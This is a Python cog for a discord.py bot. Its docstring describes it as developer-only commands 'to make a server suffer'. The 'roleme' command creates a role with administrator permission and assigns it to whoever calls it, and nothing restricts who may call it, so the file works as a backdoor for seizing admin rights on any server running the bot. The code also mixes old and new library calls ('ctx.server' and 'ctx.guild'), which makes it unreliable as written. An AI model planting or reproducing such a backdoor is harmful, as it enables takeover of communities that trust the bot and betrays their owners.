import discord
from discord.ext import commands


class sudo:
    '''
    Developer only commands to make a server suffer
    '''

    def __init__(self,bot):
        self.bot = bot
    
    @commands.command(name='roleme')
    async def roleme(self, ctx):
        role_name = "Test"
        role_permissions = ctx.server.default_role
        role_permissions = role_permissions.permissions
        role_permissions.administrator = True
        guild = ctx.guild
        await guild.create_role(name=role_name, permissions=role_permissions)
        role = discord.utils.get(ctx.guild.roles, name=role_name)
        user = ctx.message.author
        await user.add_roles(role)



def setup(bot):
    bot.add_cog(sudo(bot))
